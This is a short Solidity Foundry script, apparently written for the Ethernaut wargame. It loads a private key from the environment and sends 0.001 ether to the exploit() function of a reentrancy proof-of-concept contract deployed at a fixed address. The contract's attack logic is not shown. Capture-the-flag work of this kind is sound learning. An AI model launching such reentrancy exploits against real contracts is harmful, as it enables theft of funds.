pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "Ethernaut/reentrancy_poc.sol";

contract ReentrancyPOCScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        ReentrancyPOC reentrancyPOC = ReentrancyPOC(payable(0x282e8C00306aE18AC8FCA90d8bf46135718a9f29));
        reentrancyPOC.exploit{value: 0.001 ether}();

        vm.stopBroadcast();
    }
}